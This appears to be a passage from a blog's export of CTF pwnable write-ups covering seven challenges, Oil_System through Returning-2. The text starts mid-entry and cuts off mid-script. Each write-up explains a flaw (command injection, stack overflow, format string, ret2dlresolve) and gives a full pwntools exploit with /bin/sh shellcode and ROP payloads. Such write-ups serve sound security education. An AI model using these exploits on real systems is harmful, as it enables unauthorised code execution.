<h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p>
<p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p>
<p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 UT CTF</title>
    <url>/2021/03/12/2021-03-13-UT_CTF_2021/</url>
    <content><![CDATA[<center>2021 UT CTF Write-up </center>


<h1 id="2SMOL-pwnable"><a href="#2SMOL-pwnable" class="headerlink" title="2SMOL (pwnable)"></a>2SMOL (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png" alt="3"></p>
<p>First, Check the protection. All of protection is turned off. </p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/49066484/111152849-8c662f00-85d4-11eb-8ccb-c393df5329c3.png" alt="1"></p>
<p><img src="https://user-images.githubusercontent.com/49066484/111152852-8e2ff280-85d4-11eb-899a-2cae6da1e8a6.png" alt="2"></p>
<p>It called only <code>read</code>functions. but the size of read is bigger than buffer. It is Buffer OverFlow.<br>And NXbit is turned off, So I can use shellcode to exploit.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111154625-c59f9e80-85d6-11eb-84fe-5de9baf007c9.png" alt="4"></p>
<p>But we only have 0x8 size to write. It is not enough to write shellcode on the stack, and also even if we can write shellcode on the stack, we can’t leak the stack address. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/111156001-92f6a580-85d8-11eb-8e21-c7cdab70b5a7.png" alt="6"></p>
<p>So we have to write on memory which we know address. It is <code>0x402000</code>. We can change the flow by using <code>leave ret</code> gadgets. then  we can write shellcode on memory. Lastly, overwrite return address to shellcode’s address.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.utctf.live&#x27;</span>, <span class="number">9998</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smol&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./smol&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x402018</span></span><br><span class="line">fakerbp = <span class="number">0x402068</span></span><br><span class="line">syscall = <span class="number">0x40103d</span></span><br><span class="line">before_read = <span class="number">0x401015</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(fakerbp)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x402028</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="resolve-pwnable"><a href="#resolve-pwnable" class="headerlink" title="resolve (pwnable)"></a>resolve (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111622144-2aa00200-882c-11eb-83f4-e8f4510ff132.png" alt="1"></p>
<p>First, Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111622787-ef520300-882c-11eb-82fc-556f204c52f1.png" alt="2"></p>
<p>The main function only call <code>get@plt</code>. It can occur overflow here. But there is no way to leak libc address and also doesn’t have system functions which can call <code>/bin/sh</code> in binary. But the method for exploit can be inferred from the name of the problem. The name is <code>resolve</code>. So i used <code>return-to-dl-resolve</code>. </p>
<p>If you don’t know well about this, Please refer to the reference.</p>
<blockquote>
<p><a href="https://www.lazenca.net/pages/viewpage.action?pageId=19300744">https://www.lazenca.net/pages/viewpage.action?pageId=19300744</a></p>
</blockquote>
<p>Then let’s find gadgets for exploit.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111624452-0e519480-882f-11eb-99ec-fd5203e6193d.png" alt="3"></p>
<p>There is <code>get</code>function. so i only need to control <code>rdi</code> for calling function. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/111624688-5670b700-882f-11eb-8768-62752ec2dfe5.png" alt="55"></p>
<p>And get section address what i need. like <code>plt</code>, <code>bss</code>, <code>dynsym</code>, <code>dynstr</code>, <code>rela.plt</code>…</p>
<p>Using <code>ROP</code>, make fake structure which is used by <code>lazy binding</code> and write on the memory which i know address. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/111625605-62a94400-8830-11eb-8a6e-86332e5f4ffa.png" alt="66"></p>
<p>In my case, I wrote on 0x404508. The red is fake structure of <strong>Elf64_Rela</strong>. And the orange is about <strong>Elf64_Sym</strong>. The last things are <code>system</code> and <code>/bin/sh</code>. </p>
<p>After making fake structure, The system function is executed by invoking the <code>plt</code>.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/111626406-4fe33f00-8831-11eb-99a7-94710e34cbe0.png" alt="8"></p>
<p>Finally, I can call <code>system(/bin/sh/)</code> </p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.utctf.live&#x27;,5435)</span></span><br><span class="line">p = process(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x004011c3</span></span><br><span class="line">prsi = <span class="number">0x004011c1</span></span><br><span class="line">leave_ret = <span class="number">0x00401158</span></span><br><span class="line">get_got = <span class="number">0x404018</span></span><br><span class="line">get_plt = <span class="number">0x401040</span></span><br><span class="line">get_code = <span class="number">0x040114e</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x404550</span></span><br><span class="line">ret = <span class="number">0x401159</span></span><br><span class="line">addr_code_get = <span class="number">0x0401142</span></span><br><span class="line"></span><br><span class="line">addr_bss = <span class="number">0x404508</span> <span class="comment">#fake_ebp</span></span><br><span class="line">addr_plt = <span class="number">0x401020</span></span><br><span class="line">addr_got_plt = <span class="number">0x404000</span></span><br><span class="line">addr_dynsym = <span class="number">0x4003c0</span></span><br><span class="line">addr_dynstr = <span class="number">0x400420</span></span><br><span class="line">addr_rela_plt = <span class="number">0x4004b8</span></span><br><span class="line">fake_reloc_struct = <span class="number">0x404508</span></span><br><span class="line">fake_r_sym = <span class="number">0x404530</span></span><br><span class="line">fake_str = <span class="number">0x404548</span></span><br><span class="line">offset = <span class="number">0x2ae</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stage1</span></span><br><span class="line"><span class="comment">#call read again for writting payload2 on .bss</span></span><br><span class="line"><span class="comment">#and call get_plt, trigger resolve</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(addr_bss)</span><br><span class="line">payload += p64(get_plt)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line"><span class="comment">#ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(addr_plt)</span><br><span class="line">payload += p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stage2</span></span><br><span class="line"><span class="comment">#write payload2 on .bss </span></span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_reloc_struct</span></span><br><span class="line">payload1 += p64(get_got)</span><br><span class="line">payload1 += p32(<span class="number">0x7</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x2ba</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload1 += p32(<span class="number">0x4128</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;system\x00\x00&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 zer0pts CTF</title>
    <url>/2021/03/06/2021-03-07-zer0pts_CTF_2021/</url>
    <content><![CDATA[<center>2021 zer0pts CTF Write-up </center>


<h1 id="Not-Beginner’s-Stack-pwnable"><a href="#Not-Beginner’s-Stack-pwnable" class="headerlink" title="Not Beginner’s Stack (pwnable)"></a>Not Beginner’s Stack (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>Let’s check the protection of the binary.<br><img src="https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png" alt="899"><br>You can find that all protection is turned off.</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">  call notvuln</span><br><span class="line">  call exit</span><br><span class="line"></span><br><span class="line">notvuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; vuln();</span><br><span class="line">  call vuln</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x100);</span><br><span class="line">  mov edx, 0x100</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return 0;</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x1000);</span><br><span class="line">  mov edx, 0x1000               ; [!] vulnerability</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return;</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
<p>They gave me source code. So it is easy to find where vulnerability is. Look at the <code>vuln</code> function. when <code>read</code> function is called, a vulnerability occurs. The buffer size is only 0x100. but the size that you can read is 0x1000. It is Buffer Overflow. Then i can overwrite the return address because the stack canary is turned off. and also i can use shellcode. (NX disabled). we can control the rsi by overwritting rbp-0x100. [<code>lea rsi, [rbp-0x100]</code>]. It means that i can arbitrary write.<br>So i changed retrun address to <code>call exit</code>  into the address to call <code>start</code> for triggering bof again. I got many opportunities to trigger bof. I wrote shellcode on the section of <code>0x00600000</code><br><img src="https://user-images.githubusercontent.com/49066484/110239479-687a6c00-7f8a-11eb-8844-89e946b56211.png" alt="bbn"><br>It was <code>rwxp</code> Permission, That’s why i used shellcode and wrote in there. Finally I overwrited return address to shellcode address and got the sh.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.ctf.zer0pts.com&#x27;,9011)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4000c3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change rsi for shellcode and write.</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600384</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#change rsi (ret addr)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0x600334</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#overwrite ret addr.</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x600284</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 Shakti CTF</title>
    <url>/2021/04/04/2021-04-03-Shakti_CTF_2021/</url>
    <content><![CDATA[<center>2021 Shakti CTF Write-up </center>

<h1 id="Birdie-pwnable"><a href="#Birdie-pwnable" class="headerlink" title="Birdie (pwnable)"></a>Birdie (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524341-004e9280-95e9-11eb-8de8-0d4ad6a23679.png" alt="CTF1"></p>
<p>First, Check the protection. It is easy to find binary address because of NoPIE.</p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/49066484/113524421-8bc82380-95e9-11eb-86b9-8077212d2a11.png" alt="CTF2"></p>
<p>When i analyzed it on IDA, i found that there are two vulnerabilities. The first one is <code>Format String Bug</code> on line 11. And the other is <code>Buffer Overflow</code> on line 13. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113524509-17da4b00-95ea-11eb-8226-4d163a6971c1.png" alt="CTF3"></p>
<p>So i could leak canary and libc addr using <code>Format String Bug</code>. And i could get <code>oneshot</code> because i knew the  libc address. </p>
<p>Let’s get the shell.</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 1111)</span></span><br><span class="line">p = process(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./birdie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007e2</span></span><br><span class="line">system = e.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x004008f3</span></span><br><span class="line">prsi = <span class="number">0x004008f1</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;name\n&#x27;</span>,<span class="string">&#x27;%15$p::%17$p::&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">libc = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;::&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">libcbase = libc - <span class="number">0x21bf7</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(oneshot)</span><br><span class="line">p.sendafter(<span class="string">&#x27;payload\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Signal-dROPper-pwnable"><a href="#Signal-dROPper-pwnable" class="headerlink" title="Signal dROPper (pwnable)"></a>Signal dROPper (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113524624-f7f75700-95ea-11eb-964c-5c42f3c189cd.png" alt="CTF4"></p>
<p>Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530052-07cd6600-9600-11eb-8ddf-12609a94aa24.png" alt="CTF5"></p>
<p><code>0x6020c0</code> includes heap address, <code>0x602120</code> includes size of heap. It seems like you can allocate up to 12 buffers but not really. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530229-74e0fb80-9600-11eb-8089-315a30970f31.png" alt="CTF6"></p>
<p>If i could overwrite read’s size (0x602120[v4]), the buffer overflow. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530470-18321080-9601-11eb-934f-3985f714c59a.png" alt="CTF7"></p>
<p>So i allocated 13 heaps, then i could overwrite the size part (0x602128). lastly i could write on buffer 0x17c16f0 bytes!</p>
<p>It only remain to leak the libc addr and overwrite return address using ROP.</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 2222)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x6020c0</span></span><br><span class="line">size = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x00400c03</span></span><br><span class="line">prsi = <span class="number">0x00400c01</span></span><br><span class="line">main = <span class="number">0x400b32</span></span><br><span class="line"></span><br><span class="line">put_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vuln</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;to: &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">    vuln()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(put_got)</span><br><span class="line">payload += p64(put_plt)</span><br><span class="line">payload += p64(<span class="number">0x4008e7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase = leak - <span class="number">0x80aa0</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">oneshot = libcbase  + <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Choice &gt; &#x27;,&#x27;3&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAAAAAAA&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments?\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;comments\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Returning-2-pwnable"><a href="#Returning-2-pwnable" class="headerlink" title="Returning-2 (pwnable)"></a>Returning-2 (pwnable)</h1><h2 id="vulnerability-2"><a href="#vulnerability-2" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113530906-38ae9a80-9602-11eb-8d67-11f5a5b44c67.png" alt="CTF8"></p>
<p>Check Protection,  No canary~</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113530956-61cf2b00-9602-11eb-8bfd-f530d08b7bcf.png" alt="CTF9"></p>
<p>It is Buffer overflow vulnerability. and also i could allocate dynamically on stack using <code>alloca</code> functions. </p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531112-d99d5580-9602-11eb-8442-fb96d5583fc5.png" alt="CTF10"></p>
<p>I could find that i can make buffer address to read  <code>rsp</code>, when  the alloca’s size is <code>-30</code>.<br>Lastly I use ROP to exploit.</p>
<h2 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;, 3333)</span></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601500</span></span><br><span class="line">push_rsp = e.symbols[<span class="string">&#x27;push_rsp&#x27;</span>]</span><br><span class="line">mov = <span class="number">0x0400774</span></span><br><span class="line">prax = <span class="number">0x040079a</span></span><br><span class="line">prdi = <span class="number">0x040077f</span></span><br><span class="line">prsi = <span class="number">0x0400791</span></span><br><span class="line">prdx = <span class="number">0x0400788</span></span><br><span class="line">syscall = <span class="number">0x04007a3</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(mov)</span><br><span class="line">payload += p64(prdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(prax)</span><br><span class="line">payload += p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;text:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span 